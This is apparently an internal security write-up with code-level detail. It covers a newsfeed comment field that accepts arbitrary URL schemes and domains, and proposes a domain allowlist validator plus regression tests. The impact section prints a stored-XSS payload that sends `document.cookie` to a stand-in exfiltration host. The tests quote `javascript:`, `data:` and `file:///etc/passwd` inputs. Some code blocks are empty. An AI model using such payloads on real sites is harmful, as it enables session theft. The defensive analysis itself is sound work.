# GAP-0182: `gif_url` accepts arbitrary URL schemes with no domain allowlist — Remediation Write-up

> ~5 pages. Fix-oriented. Verified against real code before writing; cites `file:line`.

## 1. Summary & Classification

**Bug statement**: The `CreateCommentRequest` Pydantic model in `app/routers/newsfeed.py` accepts `gif_url` as a free-form string (max 2048 chars) with no scheme validation and no domain allowlist. Any URL value — including `data:` URIs, `javascript:` URIs, `file:` paths, or arbitrary third-party HTTP URLs — passes Pydantic validation and is stored to DynamoDB, then surfaced in API responses as an `img src` attribute. This creates a stored XSS vector and enables abuse of off-platform image infrastructure.

- **Severity**: HIGH
- **Source ticket**: FEED-004
- **Owning area**: Newsfeed / Comments
- **Status**: Open (confirmed gap)
- **Verdict**: **Confirmed**. The cited line `app/routers/newsfeed.py:1585` is the field declaration. The `validate_comment_kind` validator at lines 1617–1630 only checks that `gif_url` is non-empty for `kind="gif"` comments — it performs no scheme or domain check.
- **One-line impact**: Attackers can store `data:text/html,...` or `javascript:...` URIs as GIF URLs; current CSP or future browser changes could trigger stored XSS; any HTTP URL is accepted, enabling hotlinking and off-platform content injection.
- **Related tickets**: GAP-0183 (sticker_url, same file), FEED-004

## 2. Current-State Investigation (root cause)

### Field declaration (file:line)

`app/routers/newsfeed.py:1585`:

```python

```

`max_length=2048` is the only constraint. Pydantic applies it as a string length check — no URL parsing occurs.

### Validator (file:line)

`app/routers/newsfeed.py:1617–1630`:

```python
@model_validator(mode="after")

    if self.kind == "gif":

            raise ValueError("gif_url is required for gif comments")
    elif self.kind == "sticker":
        ...
    return self
```

The validator enforces only that the field is present and non-blank for `kind="gif"`. There is no call to `urllib.parse.urlparse`, no scheme whitelist, and no domain allowlist.

### Storage path (file:line)

`app/routers/newsfeed.py:5360` stores the raw value directly into DynamoDB:

```python
"gif_url": req.gif_url,
```

And at line 5447 in the edit path:

```python
gif_url=req.gif_url,
```

The stored value is returned verbatim in read responses at `app/routers/newsfeed.py:2279`:

```python
"gif_url": it.get("gif_url"),
```

No sanitization occurs at the read layer.

### Attack surface

The frontend renders `gif_url` as an `<img src=...>` (or equivalent) in comment feeds. A `data:text/html,...` URI causes the browser to load inline HTML in an `<img>` context; with a relaxed `img-src` CSP directive, this permits arbitrary embedded content. A `javascript:` URI in some legacy or hybrid browser contexts can execute script. An `http://attacker.com/tracking.gif` URL causes an unintended beacon to an external server. Even without active XSS, these URIs pollute stored data with attacker-controlled content that may be difficult to audit or remediate after the fact.

### Dev vs prod

The gap exists identically in both environments. DynamoDB Local in dev accepts the same DynamoDB writes as prod AWS. There is no dev-mode guard or feature flag around the comment creation path.

### No existing validation in the codebase

A search across `app/` for `AnyHttpUrl`, `HttpUrl`, `url_validator`, `validate_url`, or domain-check logic applied to `gif_url` or `sticker_url` returns no results. The newsfeed router does not import any URL validation helper. The `app/core/normalize.py` module exposes `client_ip_from_request` but no URL sanitizer.

## 3. Impact / Exploit / Blast Radius

### Stored XSS (moderate risk today, high risk after CSP relaxation)

A `data:text/html,<script>fetch('https://exfil.example.com/?c='+document.cookie)</script>` value stored as `gif_url` and rendered as `<img src="data:...">` will:
- In strict `img-src` CSP: silently fail to load (no XSS), but the data is stored and returned in API responses permanently.
- If `img-src data:` is ever permitted (common in platforms that support user-uploaded images), this executes as inline HTML in some browsers.
- If the frontend renders comments server-side (SSR, SEO path), the bare URI is emitted into HTML where browser parsing rules differ.

### Off-platform content injection

Any valid `http://` or `https://` URL to an arbitrary domain is accepted. Consequences:
- **Privacy leak**: The user's browser IP and User-Agent are sent to the attacker's server when the image is loaded.
- **Phishing content**: An image from an attacker-controlled CDN (e.g., a fake platform logo) is displayed in legitimate platform comment feeds.
- **CSAM / illegal content**: The stored URL references off-platform illegal imagery; the platform serves it as first-class content from the API.

### Blast radius

All users who can post comments with `kind="gif"` are affected. No authentication bypass is needed — any authenticated user can post a malicious comment visible to all readers of that post's feed. This includes public-facing feeds if the API has public read endpoints. Existing stored comments with malicious URLs are not cleaned up by deploying the fix alone.

## 4. Fix Design (code-level)

### Change 1: Add a `_validate_gif_url` helper

Add a URL scheme + domain validator to the `validate_comment_kind` model validator. The validation logic belongs inside the existing `@model_validator(mode="after")` to keep it co-located with the `kind` guard:

```python
import re
from urllib.parse import urlparse

_ALLOWED_GIF_DOMAINS: frozenset[str] = frozenset({
    "media.giphy.com",
    "media0.giphy.com",
    "media1.giphy.com",
    "media2.giphy.com",
    "media3.giphy.com",
    "media4.giphy.com",
    "media.tenor.com",
    "c.tenor.com",
    "media.discordapp.net",  # platform-hosted proxy (optional)
})

def _validate_gif_url(url: str) -> str:
    """Validate gif_url: must be https:// and from an allowed GIF CDN domain."""
    url = url.strip()
    try:
        parsed = urlparse(url)
    except Exception:
        raise ValueError("gif_url is not a valid URL")
    if parsed.scheme not in ("https", "http"):
        raise ValueError(
            f"gif_url scheme '{parsed.scheme}' is not allowed; use https://"
        )
    host = (parsed.hostname or "").lower()
    if host not in _ALLOWED_GIF_DOMAINS:
        raise ValueError(
            f"gif_url domain '{host}' is not on the allowed GIF CDN list"
        )
    return url
```

Inside `validate_comment_kind`:

```python
if self.kind == "gif":
    if not (self.gif_url or "").strip():
        raise ValueError("gif_url is required for gif comments")
    self.gif_url = _validate_gif_url(self.gif_url)  # <-- ADD
```

### Change 2: Expose the allowlist via settings

To allow the production allowlist to be extended without a code deploy, surface it as a settings field:

```python
# app/core/settings.py
gif_cdn_allowed_domains: str = os.environ.get(
    "GIF_CDN_ALLOWED_DOMAINS",
    "media.giphy.com,media.tenor.com,c.tenor.com"
)
```

And resolve the frozenset at validation time:

```python
def _gif_allowed_domains() -> frozenset[str]:
    raw = getattr(S, "gif_cdn_allowed_domains", "") or ""
    return frozenset(d.strip().lower() for d in raw.split(",") if d.strip())
```

### SECOPS-007 dev/prod parity

- In **dev**, `media.giphy.com` and `media.tenor.com` are in the default allowlist. The example in the model docstring (`"https://media.giphy.com/x.gif"` at line 1605) already uses an allowed domain.
- In **prod**, the same allowlist applies. No conditional dev-mode bypass is introduced. The `GIF_CDN_ALLOWED_DOMAINS` env var can be set in prod `.env` to extend the list without code changes.
- Both paths use the same `_validate_gif_url` function. There is no split code path.

### Backward compatibility

Existing stored comments with non-allowlisted URLs are unaffected by the fix (the validator only runs on new writes). A data-migration sweep to audit and null out or quarantine existing malformed `gif_url` values should be scheduled as a follow-on task. For the API, clients that currently POST arbitrary URLs will receive `HTTP 422 Unprocessable Entity` with a clear validation message.

### Alternatives considered

1. **Pydantic `AnyHttpUrl` field type**: Restricts to `http://` and `https://` but does not enforce domain allowlist. Insufficient against off-platform content injection.
2. **Proxy all GIF URLs through a platform URL rewriter at write time**: Fully eliminates third-party references but is a larger infrastructure change (requires CDN/proxy setup). Recommended long-term but out of scope for this gap.
3. **CSP-only mitigation**: Tightening `img-src` in the frontend CSP prevents rendering but does not prevent storage or API leakage of malicious URIs. Defense-in-depth, not a substitute for input validation.

## 5. Testing, Verification & Rollout

### Regression test (fails before fix, passes after)

**File**: `tests/test_newsfeed_gif_url_validation.py` (new file)

```python
"""GAP-0182: gif_url must only accept https:// from allowed GIF CDN domains."""
import pytest
from pydantic import ValidationError

# Import the model under test
from app.routers.newsfeed import CreateCommentRequest


VALID_GIF = "https://media.giphy.com/media/abc123/giphy.gif"
VALID_TENOR = "https://media.tenor.com/xyz.gif"


def _make(gif_url: str) -> dict:
    return {"kind": "gif", "gif_url": gif_url}


# --- cases that must PASS validation ---

def test_valid_giphy_url():
    req = CreateCommentRequest(**_make(VALID_GIF))
    assert req.gif_url == VALID_GIF


def test_valid_tenor_url():
    req = CreateCommentRequest(**_make(VALID_TENOR))
    assert req.gif_url == VALID_TENOR


# --- cases that must FAIL validation (these pass before the fix) ---

def test_data_uri_rejected():
    with pytest.raises(ValidationError, match="scheme"):
        CreateCommentRequest(**_make("data:text/html,<script>alert(1)</script>"))


def test_javascript_uri_rejected():
    with pytest.raises(ValidationError, match="scheme"):
        CreateCommentRequest(**_make("javascript:alert(1)"))


def test_arbitrary_http_domain_rejected():
    with pytest.raises(ValidationError, match="domain"):
        CreateCommentRequest(**_make("https://attacker.example.com/evil.gif"))


def test_file_uri_rejected():
    with pytest.raises(ValidationError, match="scheme"):
        CreateCommentRequest(**_make("file:///etc/passwd"))


def test_empty_scheme_rejected():
    with pytest.raises(ValidationError, match="scheme"):
        CreateCommentRequest(**_make("//evil.com/img.gif"))
```

**Before fix**: `test_data_uri_rejected`, `test_javascript_uri_rejected`, `test_arbitrary_http_domain_rejected`, `test_file_uri_rejected`, and `test_empty_scheme_rejected` all fail because `CreateCommentRequest` accepts the inputs without raising `ValidationError`.

**After fix**: All tests pass.

### Metrics / observability

### Rollback

Removing `self.gif_url = _validate_gif_url(self.gif_url)` from `validate_comment_kind` immediately reverts to the current permissive behavior. No DynamoDB migration needed.

### Risks

- **Breakage for integrations using non-listed CDNs**: Any platform or test that currently posts GIFs from Tenor subdomains not in the initial list will receive 422s. The `GIF_CDN_ALLOWED_DOMAINS` env var allows fast-path extension without a code change.
- **Dev E2E test GIF URLs**: The `feed.spec.ts` test file uses `media.giphy.com` in its fixture (the model docstring example at line 1605), which is already in the allowlist. No test changes are expected.

### Effort: S (Small)

One new helper function (~15 lines), one settings field, three call sites updated (new validator call in the existing `validate_comment_kind`). Tests are offline/pytest only.
